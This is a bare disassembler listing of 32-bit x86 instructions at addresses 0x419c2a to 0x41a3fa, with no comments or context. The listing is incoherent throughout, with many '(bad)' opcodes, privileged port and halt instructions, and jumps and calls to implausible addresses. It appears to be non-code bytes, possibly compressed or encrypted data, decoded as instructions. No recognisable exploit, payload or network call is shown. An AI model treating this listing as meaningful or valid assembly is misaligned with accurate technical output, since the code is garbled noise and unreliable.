  419c2a:	mov    al,0xf4
  419c2c:	mov    eax,0xd282073e
  419c31:	out    dx,eax
  419c32:	into   
  419c33:	push   edx
  419c34:	xor    al,0xb6
  419c36:	push   ebp
  419c37:	dec    ecx
  419c38:	cmp    bh,BYTE PTR [ebx-0x600d0ad5]
  419c3e:	pop    ss
  419c3f:	je     0x419c5d
  419c41:	cmp    al,dl
  419c43:	xchg   esp,eax
  419c44:	cs push cs
  419c46:	fstp   TBYTE PTR [ebp-0x492ddf4a]
  419c4c:	add    BYTE PTR [edi-0x2c3b1c9b],dh
  419c52:	jae    0x419bde
  419c54:	hlt    
  419c55:	imul   edi,DWORD PTR [ecx-0x9f25b78],0x8dffd9dd
  419c5f:	cmp    ch,BYTE PTR [ebx]
  419c61:	cmp    BYTE PTR [esi],0xbe
  419c64:	jecxz  0x419c5b
  419c66:	add    BYTE PTR [ebp-0x54],cl
  419c69:	cmc    
  419c6a:	scas   al,BYTE PTR es:[edi]
  419c6b:	ins    DWORD PTR es:[edi],dx
  419c6c:	(bad)  
  419c6d:	(bad)  
  419c6e:	jne    0x419c54
  419c70:	pop    ebp
  419c71:	pop    ebp
  419c72:	mov    ds:0x6a31cf9f,eax
  419c77:	cli    
  419c78:	(bad)  
  419c7a:	aas    
  419c7b:	ficomp WORD PTR [ebp-0x33]
  419c7e:	and    dh,al
  419c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c81:	push   0x53ac610d
  419c86:	and    BYTE PTR [esi-0x74],ah
  419c89:	mov    al,ds:0x94b2f2fd
  419c8e:	hlt    
  419c8f:	cmp    eax,0x182c7a2e
  419c94:	mov    ds:0x314fa3fc,eax
  419c99:	dec    DWORD PTR [ebx]
  419c9b:	jl     0x419cf6
  419c9d:	gs gs mov edi,0x933dd5e7
  419ca4:	pop    es
  419ca5:	dec    ecx
  419ca6:	icebp  
  419ca7:	fdivr  QWORD PTR [ebx]
  419ca9:	dec    esi
  419caa:	xchg   edi,eax
  419cab:	setae  BYTE PTR [edi]
  419cae:	mov    esi,DWORD PTR es:[ecx+0x65]
  419cb2:	fimul  WORD PTR [esp+eax*2+0x71636316]
  419cb9:	xor    DWORD PTR ds:0x535e4c10,eax
  419cbf:	mov    edi,0x7b985db5
  419cc4:	push   ds
  419cc5:	dec    eax
  419cc6:	popa   
  419cc7:	pop    ecx
  419cc8:	jno    0x419d46
  419cca:	bnd jo 0x419c5f
  419ccd:	or     bh,BYTE PTR [edi]
  419ccf:	pop    ebx
  419cd0:	stc    
  419cd1:	iret   
  419cd2:	stos   DWORD PTR es:[edi],eax
  419cd3:	pop    esi
  419cd4:	or     DWORD PTR [esi-0x4a5a7b0a],ebx
  419cda:	mov    al,0xe
  419cdc:	mov    ds:0x29066457,eax
  419ce1:	jnp    0x419d62
  419ce3:	cmp    eax,0x96b3476
  419ce8:	and    al,0xd6
  419cea:	ret    0xb1e4
  419ced:	add    al,0x12
  419cef:	lods   al,BYTE PTR ds:[esi]
  419cf0:	push   ecx
  419cf1:	inc    esi
  419cf2:	jmp    0x419cbc
  419cf4:	sar    DWORD PTR [edi-0x7257cc6b],1
  419cfa:	dec    edx
  419cfb:	fnstenv [edi-0x42]
  419cfe:	sub    eax,0x3446b58d
  419d03:	or     al,0xa3
  419d05:	fmul   DWORD PTR ds:0x83737156
  419d0b:	(bad)  
  419d0c:	sub    al,BYTE PTR [esp+eiz*8-0x53877bf0]
  419d13:	sar    bh,cl
  419d15:	jecxz  0x419d94
  419d17:	xchg   esp,eax
  419d18:	xor    esp,DWORD PTR [esp+edi*4+0xa4a2c1]
  419d1f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419d21:	(bad)
  419d24:	push   esi
  419d25:	pop    edi
  419d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d27:	sub    eax,0xd2cfdf90
  419d2c:	ins    BYTE PTR es:[edi],dx
  419d2d:	mov    bh,BYTE PTR [edx+0x77]
  419d30:	xor    dl,BYTE PTR [ebx+0xf]
  419d33:	push   0x40b9fb2c
  419d38:	mul    BYTE PTR [edx]
  419d3a:	pop    ds
  419d3b:	shl    BYTE PTR [ecx-0x23d0339a],0x73
  419d42:	push   edx
  419d43:	mov    esi,0xf679e0ad
  419d48:	xor    edi,DWORD PTR [esi+0x36250882]
  419d4e:	and    al,0xd8
  419d50:	ja     0x419d2c
  419d52:	push   0x73
  419d54:	bound  eax,QWORD PTR [ebx-0x5e245af4]
  419d5a:	jae    0x419da0
  419d5c:	(bad)
  419d5f:	test   DWORD PTR [ebx-0x3e04427],edx
  419d65:	sub    dh,cl
  419d67:	adc    bl,BYTE PTR [edx+0x4f]
  419d6a:	xor    eax,DWORD PTR [eax-0x40667d28]
  419d70:	cmp    ch,BYTE PTR fs:[esi+0x14]
  419d74:	mov    esi,0x4c19e0b3
  419d79:	div    DWORD PTR [ebx-0x6c]
  419d7c:	mov    dh,0xb6
  419d7e:	xchg   DWORD PTR [edx],ecx
  419d80:	bound  edi,QWORD PTR [esi-0x27]
  419d83:	xor    BYTE PTR [eax],0xb4
  419d86:	mov    al,0xdf
  419d88:	sub    BYTE PTR [esi+0x122ea065],ah
  419d8e:	push   esp
  419d8f:	mov    edi,0x912164a0
  419d94:	lahf   
  419d95:	bnd jne 0x419e0b
  419d98:	push   es
  419d99:	lods   al,BYTE PTR ds:[esi]
  419d9a:	and    dl,ch
  419d9c:	jge    0x419d7b
  419d9e:	cmc    
  419d9f:	sub    DWORD PTR [edi],0xc3f77d00
  419da5:	das    
  419da6:	mov    ds:0x883c03ae,eax
  419dab:	xor    BYTE PTR [ebp-0x136266c1],ah
  419db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419db2:	pop    eax
  419db3:	sub    esi,DWORD PTR [edx-0x3af35e6]
  419db9:	push   edx
  419dba:	dec    eax
  419dbb:	imul   esi,DWORD PTR ds:[edi-0x47002f51],0xffffff8f
  419dc3:	test   eax,0xd32eefbd
  419dc8:	jbe    0x419dec
  419dca:	mov    dl,0x3
  419dcc:	imul   ebp,DWORD PTR [eax-0x3],0x45
  419dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd1:	jmp    0x16495367
  419dd6:	ins    DWORD PTR es:[edi],dx
  419dd7:	mov    bl,0x4f
  419dd9:	mov    ds:0x78b573e5,al
  419dde:	xor    cl,bh
  419de0:	xchg   DWORD PTR [esi+0x58],ecx
  419de3:	sar    BYTE PTR [eax+0x66],1
  419de6:	fcomp  st(6)
  419de8:	scas   al,BYTE PTR es:[edi]
  419de9:	shr    ecx,0x94
  419dec:	jne    0x419dd7
  419dee:	pop    ss
  419def:	cmp    BYTE PTR [ebx-0x54],bh
  419df2:	mov    edi,0x70ea71c0
  419df7:	mov    DWORD PTR [ecx+0x13],edi
  419dfa:	cmp    BYTE PTR [esi],dl
  419dfc:	shr    BYTE PTR [eax-0x7b],1
  419dff:	cmp    ebx,DWORD PTR [ebp+0xb]
  419e02:	or     ch,BYTE PTR [edx+0x51566f1e]
  419e08:	pop    esp
  419e09:	stos   BYTE PTR es:[edi],al
  419e0a:	cmp    di,WORD PTR [esi]
  419e0d:	jl     0x419e0b
  419e0f:	cmp    BYTE PTR [ebx+esi*2+0x736e4cb8],0xa3
  419e17:	xchg   BYTE PTR [edx-0x60d59060],ch
  419e1d:	sub    eax,0x80cf9ba3
  419e22:	lds    esp,FWORD PTR [esi-0x6f3b1e3]
  419e28:	pusha  
  419e29:	mov    dl,0xfd
  419e2b:	and    BYTE PTR [eax-0xde6b888],dh
  419e31:	push   eax
  419e32:	adc    eax,0x4d22b80d
  419e37:	(bad)  
  419e38:	mul    BYTE PTR [ebx]
  419e3a:	cmp    eax,0x463627d3
  419e3f:	jmp    DWORD PTR [edi+0x4f]
  419e42:	gs int3 
  419e44:	or     DWORD PTR [esi+edi*1],ebx
  419e47:	xchg   BYTE PTR [edx+0x7d],ch
  419e4a:	aas    
  419e4b:	scas   eax,DWORD PTR es:[edi]
  419e4c:	(bad)  
  419e4d:	imul   DWORD PTR [ecx-0x3bfe90b2]
  419e53:	aam    0x72
  419e55:	sbb    DWORD PTR [edx+0x1e404c73],eax
  419e5b:	push   edi
  419e5c:	mov    al,0xef
  419e5e:	lahf   
  419e5f:	lahf   
  419e60:	gs push cs
  419e62:	sbb    bh,BYTE PTR [ecx-0x19]
  419e65:	sub    DWORD PTR [edx-0xaadd7e3],0xb6535b0c
  419e6f:	fs pop ecx
  419e71:	inc    edx
  419e72:	mov    eax,ds:0xea216af3
  419e77:	pop    ss
  419e78:	xchg   esp,eax
  419e79:	sub    eax,0x83ff3433
  419e7e:	adc    ah,BYTE PTR [eax]
  419e80:	sbb    bl,bh
  419e82:	jl     0x419e85
  419e84:	mov    edx,0xa034ab2b
  419e89:	nop
  419e8a:	fsubr  QWORD PTR [ecx+ecx*4+0x3a]
  419e8e:	in     al,0x73
  419e90:	jo     0x419e13
  419e92:	jmp    0x1a68:0x524366dc
  419e99:	fsubr  st(1),st
  419e9b:	jmp    0x419e4c
  419e9d:	dec    ecx
  419e9e:	test   eax,0xddbc4ecc
  419ea3:	add    BYTE PTR [edx-0x1a6a8928],0xee
  419eaa:	sahf   
  419eab:	cmc    
  419eac:	and    DWORD PTR [ebp+0x4e],edx
  419eaf:	sub    DWORD PTR [edi+0x5b387dd3],ecx
  419eb5:	inc    edi
  419eb6:	inc    edx
  419eb7:	addr16 mov edi,0xf4d4e730
  419ebd:	inc    DWORD PTR [edi+0x55e942b0]
  419ec3:	jno    0x419ea0
  419ec5:	push   eax
  419ec6:	cmp    BYTE PTR [ecx],dl
  419ec8:	pop    ecx
  419ec9:	dec    edx
  419eca:	rcl    ebp,cl
  419ecc:	(bad)  
  419ece:	mov    ebp,ecx
  419ed0:	xchg   edx,eax
  419ed1:	jl     0x419eca
  419ed3:	or     eax,0xb16d7252
  419ed8:	int    0xe8
  419eda:	mov    eax,0x7f18d8d6
  419edf:	es xchg ebp,eax
  419ee1:	push   ebp
  419ee2:	(bad)  
  419ee3:	scas   eax,DWORD PTR es:[edi]
  419ee4:	push   eax
  419ee5:	ds dec edx
  419ee7:	sbb    al,0x92
  419eea:	pushf  
  419eeb:	not    BYTE PTR [eax+0x61f6298c]
  419ef1:	push   ecx
  419ef2:	and    eax,0x771a96a5
  419ef7:	mov    eax,ds:0xb20afab1
  419efc:	hlt    
  419efd:	push   eax
  419efe:	into   
  419eff:	(bad)  
  419f00:	xchg   DWORD PTR [ecx],esp
  419f02:	hlt    
  419f03:	arpl   WORD PTR [ebx],si
  419f05:	je     0x419f81
  419f07:	xor    al,0x7f
  419f09:	pop    eax
  419f0a:	dec    ebp
  419f0b:	mov    al,0x3e
  419f0d:	scas   al,BYTE PTR es:[edi]
  419f0e:	pop    edi
  419f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f10:	and    eax,0x51b13699
  419f15:	retf   
  419f16:	fsub   QWORD PTR ds:0x7e359b9a
  419f1c:	mov    ah,0x2c
  419f1e:	sub    edi,DWORD PTR [edi]
  419f20:	test   DWORD PTR [esp+ebx*2-0x4f526466],edi
  419f27:	push   edx
  419f28:	jmp    FWORD PTR [edi-0x45dc4072]
  419f2e:	(bad)  
  419f30:	inc    ecx
  419f31:	push   eax
  419f32:	(bad)  [esp+esi*4]
  419f35:	sbb    BYTE PTR [ebx],cl
  419f37:	fsub   DWORD PTR [ebx+0x2b5c5b0d]
  419f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f3e:	int3   
  419f3f:	sti    
  419f40:	mov    ebp,0x3d4c80c9
  419f45:	sbb    al,bl
  419f47:	pop    esp
  419f48:	push   ss
  419f49:	stc    
  419f4a:	xchg   ecx,eax
  419f4b:	xchg   BYTE PTR [edx+0x7b98f8c8],cl
  419f51:	push   ebx
  419f52:	xchg   esp,eax
  419f53:	mov    ebp,0x47953fc
  419f58:	inc    ebx
  419f59:	pop    edx
  419f5a:	popf   
  419f5b:	aam    0x95
  419f5d:	test   BYTE PTR [ebp-0x6e0ba1b3],bl
  419f63:	and    eax,0x8020314d
  419f68:	stc    
  419f69:	dec    ebp
  419f6a:	call   0x6b3a9fef
  419f6f:	sahf   
  419f70:	sbb    DWORD PTR [ecx],ebp
  419f72:	rol    DWORD PTR [edi+0x3e4b67cd],1
  419f78:	aas    
  419f79:	and    al,0x2a
  419f7b:	or     cl,BYTE PTR [edi+0x4a]
  419f7e:	bound  ebp,QWORD PTR [ecx+0x5937fe16]
  419f84:	mov    ecx,0x6e0b85cd
  419f89:	in     eax,0x91
  419f8b:	out    dx,eax
  419f8c:	addr16 hlt 
  419f8e:	fdiv   DWORD PTR [ecx+eax*1]
  419f91:	add    eax,0xcfbbe1c4
  419f96:	lods   eax,DWORD PTR ds:[esi]
  419f97:	imul   esp,DWORD PTR [ebx+edi*1-0x3aba0657],0xeea183e5
  419fa2:	or     eax,0x51c66f2f
  419fa8:	mov    ebp,0x6a2379f9
  419fad:	enter  0x435a,0xe5
  419fb1:	mov    esi,0x6e03c4e9
  419fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fb7:	leave  
  419fb8:	out    0xc4,al
  419fba:	ins    BYTE PTR es:[edi],dx
  419fbb:	inc    esp
  419fbc:	ror    ah,1
  419fbe:	xchg   esi,eax
  419fbf:	sbb    BYTE PTR [ebx+0x393741b],dh
  419fc5:	ret    
  419fc6:	adc    BYTE PTR [ecx],0xdf
  419fc9:	fnsave [ebp-0x7811ab25]
  419fcf:	or     bh,ch
  419fd1:	add    BYTE PTR [eax-0x60],al
  419fd4:	sub    bh,BYTE PTR [ebx]
  419fd6:	jecxz  0x419fc5
  419fd8:	ret    0xa168
  419fdb:	cmp    eax,0x87e81452
  419fe0:	fwait
  419fe1:	adc    eax,0xe20a91be
  419fe6:	mov    dh,0x6a
  419fe8:	pop    ebx
  419fe9:	icebp  
  419fea:	js     0x419fbc
  419fec:	scas   al,BYTE PTR es:[edi]
  419fed:	lods   eax,DWORD PTR ds:[esi]
  419fee:	inc    si
  419ff0:	push   ds
  419ff1:	retf   0xfff7
  419ff4:	xchg   edi,eax
  419ff5:	jae    0x419fbf
  419ff7:	xchg   esp,eax
  419ff8:	ret    0x6401
  419ffb:	(bad)  
  419ffc:	mov    esi,0x655483e6
  41a001:	in     al,dx
  41a002:	sub    BYTE PTR [ebx-0x6e],0xe4
  41a006:	inc    edx
  41a007:	enter  0xe73f,0x45
  41a00b:	rol    BYTE PTR [edx+ecx*8],1
  41a00e:	adc    al,0x29
  41a010:	xchg   esp,eax
  41a011:	mov    ebx,0xc7cbac21
  41a016:	inc    eax
  41a017:	fwait
  41a018:	lds    edx,FWORD PTR [esi+0x2]
  41a01b:	fdivr  DWORD PTR [ebx-0x2c]
  41a01e:	mov    edi,0xcb201d48
  41a023:	and    BYTE PTR [eax+0x2c],dh
  41a026:	pop    ecx
  41a027:	div    BYTE PTR [edi-0x34adef3b]
  41a02d:	fnsave [edi+0x4bc7f344]
  41a033:	mov    ecx,0xb3136f5d
  41a038:	inc    eax
  41a039:	and    DWORD PTR [ebx-0x18e19ec1],0x77
  41a040:	fs cli 
  41a042:	cld    
  41a043:	out    dx,al
  41a044:	add    ch,BYTE PTR [esi]
  41a046:	in     al,dx
  41a047:	repnz lods al,BYTE PTR ds:[esi]
  41a049:	aas    
  41a04a:	push   ss
  41a04b:	jnp    0x41a010
  41a04d:	sti    
  41a04e:	repnz sti 
  41a050:	sub    eax,ebp
  41a052:	es xchg esp,eax
  41a054:	sub    bl,BYTE PTR [edi-0x43]
  41a057:	mov    bh,0x6
  41a059:	cs cmp al,0x26
  41a05c:	sub    DWORD PTR [ecx+0x4c],0x0
  41a060:	xchg   ebx,eax
  41a061:	cld    
  41a062:	leave  
  41a063:	sar    ch,0x97
  41a066:	adc    bl,BYTE PTR [esi+0x46d129]
  41a06c:	popf   
  41a06d:	cmp    eax,ecx
  41a06f:	ret    0x8a36
  41a072:	test   al,0xf5
  41a074:	adc    esi,ebp
  41a076:	push   esi
  41a077:	jnp    0x419ffe
  41a079:	xchg   ebp,eax
  41a07a:	fwait
  41a07b:	shr    DWORD PTR [ebx-0x21af73b0],0x46
  41a082:	retf   
  41a083:	mov    ecx,0x7481138b
  41a088:	call   0xcea9:0xc61dff9a
  41a08f:	scas   eax,DWORD PTR es:[edi]
  41a090:	lds    eax,FWORD PTR [ecx-0x76fb818a]
  41a096:	jbe    0x41a0f0
  41a098:	test   DWORD PTR ds:0x8e60c5b,edi
  41a09e:	in     eax,dx
  41a09f:	out    dx,eax
  41a0a0:	stc    
  41a0a1:	xchg   edx,eax
  41a0a2:	and    eax,0x2b2d4dd7
  41a0a7:	xor    bl,ch
  41a0a9:	addr16 into 
  41a0ab:	and    cl,BYTE PTR fs:[ecx]
  41a0ae:	cmp    eax,DWORD PTR [edx]
  41a0b0:	jbe    0x41a0eb
  41a0b2:	mov    eax,ds:0x7ce745a7
  41a0b7:	test   eax,0x620c4ce9
  41a0bc:	mov    ebp,0xc1d4e2ee
  41a0c1:	adc    BYTE PTR [esp+esi*4+0x6025a301],bh
  41a0c8:	les    esi,FWORD PTR [eax+esi*2+0x18c32ce5]
  41a0cf:	call   0x146b964b
  41a0d4:	enter  0xc8a1,0x9b
  41a0d8:	pop    ds
  41a0d9:	aaa    
  41a0da:	cmp    bl,BYTE PTR [edi+ecx*1+0x12]
  41a0de:	pop    es
  41a0df:	xchg   esi,eax
  41a0e0:	mov    al,ah
  41a0e2:	push   esp
  41a0e3:	(bad)  
  41a0e5:	sar    DWORD PTR [ebx+0x1f],0x48
  41a0e9:	xchg   ebp,eax
  41a0ea:	xchg   esi,eax
  41a0eb:	scas   al,BYTE PTR es:[edi]
  41a0ec:	sub    cl,bh
  41a0ee:	dec    ebx
  41a0ef:	lea    edx,[ebp-0x6a]
  41a0f2:	jmp    0x5640:0x502cd664
  41a0f9:	sub    DWORD PTR [ecx+0x7379958],edx
  41a0ff:	popf   
  41a100:	mov    al,BYTE PTR [ebx+0x2eca63a3]
  41a106:	imul   eax,DWORD PTR [edx+0x5ce8b5e4],0x40
  41a10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a10e:	sbb    esp,DWORD PTR [ebp-0x661cb24d]
  41a114:	push   edi
  41a115:	lock adc esp,0xdfaa871d
  41a11c:	push   0x49
  41a11e:	test   ecx,eax
  41a120:	and    DWORD PTR [esi],esi
  41a122:	inc    edi
  41a123:	dec    ecx
  41a124:	push   ebx
  41a125:	scas   eax,DWORD PTR es:[edi]
  41a126:	add    al,BYTE PTR [ecx+0x624de546]
  41a12c:	std    
  41a12d:	jecxz  0x41a0e4
  41a12f:	add    ebp,ecx
  41a131:	(bad)  [esi-0x60dfa83e]
  41a137:	fiadd  DWORD PTR [eax]
  41a139:	jns    0x41a0c0
  41a13b:	mov    BYTE PTR [edx],bl
  41a13d:	lds    eax,FWORD PTR [ecx-0x43427fc2]
  41a143:	stos   BYTE PTR es:[edi],al
  41a144:	cmp    bh,cl
  41a146:	into   
  41a147:	mov    ebp,0x3c661cc6
  41a14c:	sub    edx,eax
  41a14e:	pop    edx
  41a14f:	sbb    BYTE PTR [eax+0x37],bl
  41a152:	mov    bh,0x23
  41a154:	dec    BYTE PTR [edx-0x181be7e7]
  41a15a:	(bad)  
  41a15b:	mov    ecx,0x17217429
  41a160:	or     bl,ah
  41a162:	inc    esp
  41a163:	mov    fs,esi
  41a165:	and    al,0x18
  41a167:	clc    
  41a168:	xor    bh,dl
  41a16a:	bound  ebx,QWORD PTR ds:0x651535d9
  41a170:	mov    ebp,0xa884536
  41a175:	sbb    BYTE PTR [eax-0x3],dl
  41a178:	sbb    BYTE PTR [eax+0x59],dh
  41a17b:	dec    ecx
  41a17c:	push   edi
  41a17d:	loopne 0x41a131
  41a17f:	xor    eax,0x9a8ff58d
  41a184:	add    cl,BYTE PTR [ecx+0x46200f4]
  41a18a:	xchg   ecx,eax
  41a18b:	std    
  41a18c:	call   0xdfa0dbbf
  41a191:	ins    DWORD PTR es:[edi],dx
  41a192:	push   edx
  41a193:	loop   0x41a1e5
  41a195:	scas   eax,DWORD PTR es:[edi]
  41a196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a197:	jge    0x41a1e8
  41a199:	sar    BYTE PTR [edx-0x52438f97],cl
  41a19f:	inc    eax
  41a1a0:	inc    edi
  41a1a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1a2:	xchg   DWORD PTR [edx+0x68c9f4d6],ebx
  41a1a8:	or     dh,cl
  41a1aa:	pusha  
  41a1ab:	paddsw mm4,QWORD PTR [edi-0xc187933]
  41a1b2:	push   cs
  41a1b3:	mov    edi,0x72065f46
  41a1b8:	push   ebp
  41a1b9:	inc    esi
  41a1ba:	xchg   esi,eax
  41a1bb:	or     ah,dl
  41a1bd:	fs jb  0x41a18b
  41a1c0:	out    dx,al
  41a1c1:	add    dl,dl
  41a1c3:	imul   esp,DWORD PTR ds:0x4ce0a23f,0x43fc17b1
  41a1cd:	rol    BYTE PTR ds:[ecx],0x6a
  41a1d1:	inc    ebp
  41a1d2:	adc    al,0x61
  41a1d4:	dec    ebp
  41a1d5:	sar    BYTE PTR [ecx-0x5c77691f],0x2d
  41a1dc:	pop    ecx
  41a1dd:	and    DWORD PTR ds:0x75c4f75f,edi
  41a1e3:	lock add ah,cl
  41a1e6:	bnd ja 0x41a1d1
  41a1e9:	and    ch,BYTE PTR [ebx+0x9]
  41a1ec:	call   0xe18f76c9
  41a1f1:	cli    
  41a1f2:	repnz mov ecx,DWORD PTR ds:[ebx-0x3]
  41a1f7:	out    0x1a,al
  41a1f9:	inc    esi
  41a1fa:	add    dh,ah
  41a1fc:	out    dx,eax
  41a1fd:	xchg   dl,bl
  41a1ff:	sub    BYTE PTR [eax-0x63],bh
  41a202:	into   
  41a203:	add    edx,ebx
  41a205:	sub    DWORD PTR [ecx],0x0
  41a208:	out    0x38,al
  41a20a:	int    0x8f
  41a20c:	add    DWORD PTR [ebp-0x6a0e60f],edi
  41a212:	jmp    0x2772bd76
  41a217:	fnsave [ebx+ebx*1+0x19]
  41a21b:	adc    eax,0x1976c83b
  41a220:	call   0xf8b539b0
  41a225:	jnp    0x41a261
  41a227:	nop
  41a228:	sub    cx,WORD PTR [ecx]
  41a22b:	or     BYTE PTR [ebx],ah
  41a22d:	or     BYTE PTR [esi],cl
  41a22f:	stos   DWORD PTR es:[edi],eax
  41a230:	jecxz  0x41a2a5
  41a232:	cmp    BYTE PTR [ebx],ch
  41a234:	aad    0xdf
  41a236:	mov    dl,0xcf
  41a238:	adc    esp,0xffffff8a
  41a23b:	imul   edi,DWORD PTR [edx+0x1d],0xe770fcd0
  41a242:	out    0x9e,eax
  41a244:	sar    BYTE PTR [ecx],1
  41a246:	bound  esp,QWORD PTR [edx+ebx*2+0x12478c65]
  41a24d:	xor    BYTE PTR [esi+0x3a],cl
  41a250:	mov    esi,0xf0d6b58d
  41a255:	lock jno 0x41a203
  41a258:	daa    
  41a259:	and    eax,0x616bfbdb
  41a25e:	stos   BYTE PTR es:[edi],al
  41a25f:	cmp    eax,0xcd8abb9f
  41a264:	idiv   esp
  41a266:	add    eax,DWORD PTR [esi+0x3f]
  41a269:	icebp  
  41a26a:	sub    bl,dh
  41a26c:	ja     0x41a296
  41a26e:	in     al,0x94
  41a270:	cmp    ah,BYTE PTR [ecx]
  41a272:	mov    ah,0xe2
  41a274:	mov    bh,0x69
  41a276:	cmp    BYTE PTR ds:0xc4612c97,cl
  41a27c:	pop    eax
  41a27d:	test   bh,ah
  41a27f:	das    
  41a280:	jo     0x41a250
  41a282:	dec    eax
  41a283:	dec    esi
  41a284:	cmp    esi,eax
  41a286:	adc    eax,0xe26862e4
  41a28b:	and    bl,al
  41a28d:	mov    ds:0x7918a76a,al
  41a292:	jmp    0x41a291
  41a294:	jecxz  0x41a2b6
  41a296:	popf   
  41a297:	bound  ebp,QWORD PTR [ebx+ebp*2]
  41a29a:	mov    DWORD PTR [ebx+0x6a],ebx
  41a29d:	xor    BYTE PTR [eax],bl
  41a29f:	jl     0x41a2e2
  41a2a1:	ret    0xc4e9
  41a2a4:	inc    ebp
  41a2a6:	ret    
  41a2a7:	or     BYTE PTR [esi],cl
  41a2a9:	xor    al,0xf3
  41a2ab:	push   edi
  41a2ac:	jo     0x41a24e
  41a2ae:	xchg   edx,eax
  41a2af:	push   eax
  41a2b0:	xchg   ebp,eax
  41a2b1:	cmp    dl,BYTE PTR [ecx+0x73]
  41a2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b5:	cs cld 
  41a2b7:	pop    ebp
  41a2b8:	mov    al,0x7c
  41a2ba:	sahf   
  41a2bb:	fdivr  DWORD PTR [ebx+0x32d38b6d]
  41a2c1:	and    DWORD PTR [eax],edi
  41a2c3:	ror    dh,1
  41a2c5:	into   
  41a2c6:	or     bh,ch
  41a2c8:	dec    edi
  41a2c9:	mov    ds:0xd2d58f30,al
  41a2ce:	ja     0x41a250
  41a2d0:	vpmaddwd ymm0,ymm7,YMMWORD PTR [edi+0x67]
  41a2d5:	fwait
  41a2d6:	arpl   WORD PTR [ebx+0x7b451e],ax
  41a2dc:	test   BYTE PTR [ecx+0x6c],bl
  41a2df:	imul   esp,esi,0x6c643451
  41a2e5:	xor    ch,bh
  41a2e7:	push   ds
  41a2e8:	out    dx,eax
  41a2e9:	or     eax,0xabe0978c
  41a2ee:	cmp    DWORD PTR [esi-0x51],esi
  41a2f1:	scas   al,BYTE PTR es:[edi]
  41a2f2:	test   ch,dl
  41a2f4:	xor    al,0xeb
  41a2f6:	xor    dl,bh
  41a2f8:	push   ebx
  41a2f9:	mov    DWORD PTR [edi+edx*2+0x3],ecx
  41a2fd:	hlt    
  41a2fe:	call   0x8a2147af
  41a303:	mov    ch,0x9c
  41a305:	dec    ebx
  41a306:	mov    eax,0x9911712e
  41a30b:	rol    BYTE PTR [edi-0x27cbf11e],1
  41a311:	jb     0x41a336
  41a313:	cmp    BYTE PTR [ecx],ah
  41a315:	inc    cl
  41a317:	rcr    DWORD PTR [eax-0xabf3483],cl
  41a31d:	ds dec ecx
  41a31f:	dec    ebp
  41a320:	test   BYTE PTR [eax-0xa4f3d8d],0xe6
  41a327:	xor    eax,0xe447149b
  41a32c:	xlat   BYTE PTR ds:[ebx]
  41a32d:	and    BYTE PTR [esi-0x4],bl
  41a330:	int3   
  41a331:	inc    ebp
  41a332:	push   cs
  41a333:	or     ecx,DWORD PTR [esi-0x7890c136]
  41a339:	call   DWORD PTR [esi+edi*2-0x4d]
  41a33d:	add    eax,0x6f85bd8e
  41a342:	mov    edx,0x4045b927
  41a347:	sub    eax,0x55cfcd1a
  41a34c:	mov    dl,ch
  41a34e:	test   edi,ecx
  41a350:	sub    BYTE PTR [ebx+0xb],dh
  41a353:	xor    DWORD PTR [ecx-0x27],0xfffffff0
  41a357:	xchg   esp,eax
  41a358:	lods   eax,DWORD PTR ds:[esi]
  41a359:	clc    
  41a35a:	icebp  
  41a35b:	dec    ebx
  41a35c:	repnz (bad) [esi-0x9ca38ab]
  41a363:	outs   dx,DWORD PTR ds:[esi]
  41a364:	or     eax,ebx
  41a366:	(bad)  
  41a367:	sub    ah,BYTE PTR [edi]
  41a369:	add    bh,BYTE PTR [ebp-0x36876ca7]
  41a36f:	in     eax,0xe
  41a371:	imul   edx,DWORD PTR [esi+0x3f],0xfffffffe
  41a375:	loope  0x41a34c
  41a377:	mov    cl,0xff
  41a379:	inc    edx
  41a37a:	xchg   ecx,eax
  41a37b:	js     0x41a3a9
  41a37d:	adc    BYTE PTR [eax+0x70b2e112],0x15
  41a384:	mov    eax,ds:0xf71575c0
  41a389:	mov    eax,0x1bf9470b
  41a38e:	imul   edx,DWORD PTR [edx+0x616782cb],0x51
  41a395:	mov    bl,0x63
  41a397:	pop    ebx
  41a398:	xor    al,0x24
  41a39a:	cs xor eax,0xb882989c
  41a3a0:	dec    esp
  41a3a1:	fsub   st(2),st
  41a3a3:	jb     0x41a344
  41a3a5:	ds jne 0x41a359
  41a3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3a9:	aad    0xf6
  41a3ab:	add    al,0x6c
  41a3ad:	aam    0x19
  41a3af:	sub    BYTE PTR [ecx],0x1f
  41a3b2:	into   
  41a3b3:	fcom   QWORD PTR [eax-0x23]
  41a3b6:	xchg   BYTE PTR [eax+0x34259b58],cl
  41a3bc:	scas   al,BYTE PTR es:[edi]
  41a3bd:	scas   eax,DWORD PTR es:[edi]
  41a3be:	not    DWORD PTR [ecx+0x23]
  41a3c1:	arpl   di,di
  41a3c3:	mov    bl,0x8b
  41a3c5:	loop   0x41a402
  41a3c7:	push   ecx
  41a3c8:	lock sbb al,bh
  41a3cb:	stos   DWORD PTR es:[edi],eax
  41a3cc:	gs (bad) 
  41a3ce:	in     al,0x75
  41a3d0:	rcr    DWORD PTR [eax],1
  41a3d2:	mov    edx,0x3e50cf02
  41a3d7:	pop    eax
  41a3d8:	mov    DWORD PTR [ebp+0x1e03bc0],esp
  41a3de:	lods   al,BYTE PTR ds:[esi]
  41a3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e0:	ret    0x9351
  41a3e3:	aad    0x54
  41a3e5:	stc    
  41a3e6:	mov    al,ds:0xeaa535fc
  41a3eb:	mov    edi,0x7940e7d3
  41a3f0:	add    ebp,DWORD PTR [edi-0x5]
  41a3f3:	push   ss
  41a3f4:	jmp    0x41a3e6
  41a3f6:	out    0x33,eax
  41a3f8:	stos   DWORD PTR es:[di],eax
  41a3fa:	add    ah,BYTE PTR [esi]
